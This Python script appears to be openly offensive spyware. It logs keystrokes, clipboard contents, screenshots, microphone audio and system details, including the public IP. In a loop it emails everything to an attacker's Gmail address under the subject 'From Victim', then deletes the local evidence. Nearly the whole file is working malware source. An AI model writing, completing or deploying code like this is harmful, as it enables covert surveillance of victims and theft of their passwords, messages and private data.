import threading
from os import listdir
from os.path import isfile, join
# for microphone feature
import sounddevice as sd
from scipy.io.wavfile import write

from pyperclip import paste
from datetime import datetime
import smtplib
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from time import sleep

import pyautogui
import os
from pynput.keyboard import Key, Listener
import os
import platform
import socket

from requests import get

ROOT_DIR = os.path.dirname(os.path.abspath(__file__))  # Get the path of the project
extend = '\\'
system_information = "sysinfo.txt"  # save system info in text file


def clipboard():
    def myStrip(textToStrip):  # <-- Important.. don't delete
        """
        this function will help stripping the text from the [Carriage Return] character.
        this is important because if this character is in the text the code will fail to check if the text already
        exists in the file.
        """
        textToStrip = textToStrip.strip()
        textToStrip = textToStrip.replace(chr(10), ' ')
        textToStrip = textToStrip.replace(chr(13), '')
        return textToStrip

    def get_timestamp():
        """
        :return: string time stamp to be put before the copied text.
        """
        now = datetime.now()
        date_string = now.strftime("%Y-%m-%d %H:%M:%S")
        time = f"[{date_string}] - "
        return time

    def append_clipboard():
        """
        The main function that should be called every X seconds.

        checks for any new text in the clipboard, and saves it in "clipboard.txt" file.
        """
        text = myStrip(paste())

        for line in LINES:
            if text in line:
                return

        text = get_timestamp() + text
        LINES.append(text)

   
    def clipboard():
        global LINES
        counter = 0
        while True:
            append_clipboard()
            sleep(1)
            counter += 10
            if counter >= 10:  # <--  every 15 minutes
                # send to email
                # print(LINES)
                # LINES.clear()
                counter = 0

    clipboard()


microphone_time = 10  # micro record time
ROOT_DIR = os.path.dirname(os.path.abspath(__file__))  # Get the path of the project
extend = '\\'
audio_information = "audio.wav"  # save audio info in a file


def microphone():
    fs = 44100   # frequency in digital audio
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()    # recording take place

    write(ROOT_DIR + extend + audio_information, fs, myrecording)


def send_mail(recipient, subject, textContent, files=None):
    try:

        # Setup the MIME
        message = MIMEMultipart()
        message['From'] = SENDER_EMAIL
        message['To'] = recipient
        message['Subject'] = subject  # The subject line

        # The body and the attachments for the mail
        message.attach(MIMEText(textContent, 'plain'))
        # Create SMTP session for sending the mail

        for f in files or []:
            with open(f, "rb") as fil:    # read bytes
                part = MIMEApplication(
                    fil.read(),
                    Name=basename(f)
                )
            # After the file is closed
            part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
            message.attach(part)

        session = smtplib.SMTP('smtp.gmail.com', 587)  # use gmail with port
        session.starttls()  # enable security
        session.login(SENDER_EMAIL, SENDER_PASS)  # login with mail_id and password
        text = message.as_string()
        session.sendmail(SENDER_EMAIL, recipient, text)
        session.quit()
        print('Success!!')
        return True
    except Exception as e:
        print('\n\n--------------------------------------------------------\n\n'
              + str(e) + '\n\n--------------------------------------------------------\n\n')
        return False


def screenshot():
    while True:
        if not os.path.exists(OUTPUT_FOLDER):
            os.mkdir(OUTPUT_FOLDER)
        screenshotsNumber = len(os.listdir(OUTPUT_FOLDER))
        if screenshotsNumber > 3:
            continue
        import datetime

        file_ID = str(datetime.date.today()) + str(datetime.datetime.now().hour) + str(
            datetime.datetime.now().minute) + str(datetime.datetime.now().second)
        myScreenshot = pyautogui.screenshot()
        OUTPUT_FILE = os.path.join(OUTPUT_FOLDER, file_ID + EXTENSION)
        myScreenshot.save(OUTPUT_FILE)
        print("[CAPTURED] Screenshot has been taken.")
        sleep(SLEEPING_TIME)


def keylogger():
    global count
    count = 0

    def on_press(key):
        keys.append(key)
        print(keys)
        global count
        count += 1

    def write_file(keys):
        with open(ROOT_DIR + "\\" + keys_information, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    if count >= 1:
        count = 0
        global keys
        write_file(keys)
        keys = []

    # if key == Key.esc:
    def on_release(key):
        if key == Key.esc:
            pass

    # , on_release=on_release
    def keyLogger():
        with Listener(on_press=on_press, on_release=on_release) as lis:
            lis.join()

    keyLogger()


def computer_info():
    with open(ROOT_DIR + extend + system_information, 'a') as f:
        hostname = socket.gethostname()   # get name of the machine
        IPaddr = socket.gethostbyname(hostname)   # get priv ip
        try:
            public_ip = get("https://api.ipify.org").text   # get public ip
            f.write("public ip is " + public_ip)
        except Exception:
            f.write("couldnt get ip ")

        f.write("proccessor: " + (platform.processor()) + '\n')
        f.write("system: " + platform.system() + " " + platform.version() + '\n')
        f.write("machine: " + hostname + "\n")
        f.write("private ip : " + IPaddr + '\n')


keys_information = 'key_log.txt'  # save key info in text file
clipboared_information = "clipboaredinfo.txt"  # save clipboared info in text file

keys = []

OUTPUT_FOLDER = os.path.join(ROOT_DIR, "Screenshots")  # Specify output folder
EXTENSION = ".png"  # Choose the saving extension
SLEEPING_TIME = 10  # With seconds

SENDER_EMAIL = '' # add attacker Email
SENDER_PASS = ""  # Email's password

LINES = []

computer_info()
threading.Thread(target=screenshot).start()
threading.Thread(target=clipboard).start()
threading.Thread(target=keylogger).start()

fileName = "Screenshots"


def deleteFiles():
    [os.remove(join("Screenshots", f)) for f in listdir("Screenshots") if isfile(join("Screenshots", f))]
    if os.path.exists('audio.wav'):
        os.remove("audio.wav")
    print("Files DELETED")


computer_info()
while True:
    microphone()
    sleep(10)
    print(LINES)
    print(keys)
    while not os.path.exists("audio.wav") and not os.path.exists("sysinfo.txt"):
        pass
    screenshots = [join("Screenshots", f) for f in listdir("Screenshots") if isfile(join("Screenshots", f))]
    screenshots.extend(["sysinfo.txt", "audio.wav"])
    send_mail('', 'From Victim', f"Clipboard: {str(LINES)}\nKeys: {keys}", screenshots)  # add attacker Email in the first parameter
    deleteFiles()
    keys.clear()
    LINES.clear()
